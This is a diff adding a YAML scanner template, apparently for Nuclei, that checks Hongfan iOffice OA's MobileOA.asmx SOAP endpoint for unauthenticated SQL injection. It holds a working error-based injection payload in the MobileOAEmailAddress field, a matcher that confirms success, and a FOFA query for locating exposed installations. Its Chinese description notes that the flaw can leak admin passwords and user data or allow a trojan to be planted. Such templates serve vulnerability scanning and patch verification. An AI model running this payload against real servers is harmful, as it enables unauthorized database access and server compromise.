@@ -1,0 +1,35 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==500 && contains_all(body,"qzbq1qjpbq")
+          name: SQL注入
+          type: dsl
+      raw:
+        - |
+          POST /iOffice/prg/set/wss/MobileOA.asmx HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: text/xml; charset=utf-8
+
+          <?xml version="1.0" encoding="utf-8"?>
+          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+                 xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+            <soap:Body>
+              <GeMrNewData xmlns="http://tempuri.org/">
+              <MobileOAEmailAddress>' AND 5079 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5079=5079) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(98)+CHAR(113)))-- eqJq</MobileOAEmailAddress>
+            </GeMrNewData>
+            </soap:Body>
+          </soap:Envelope>
+id: HongFan-OA-MobileOA-sqlInjection
+info:
+    author: HuanXiong
+    description: |-
+        fofa: app="红帆-ioffice"
+        红帆OA MobileOA.asmx 接口处未对用户的输入进行过滤和校验，未经身份验证的攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 红帆OA MobileOA.asmx SQL注入
+    reference:
+        - null
+    severity: high
+    tags:
+        - 红帆-ioffice
+        - 红帆oa
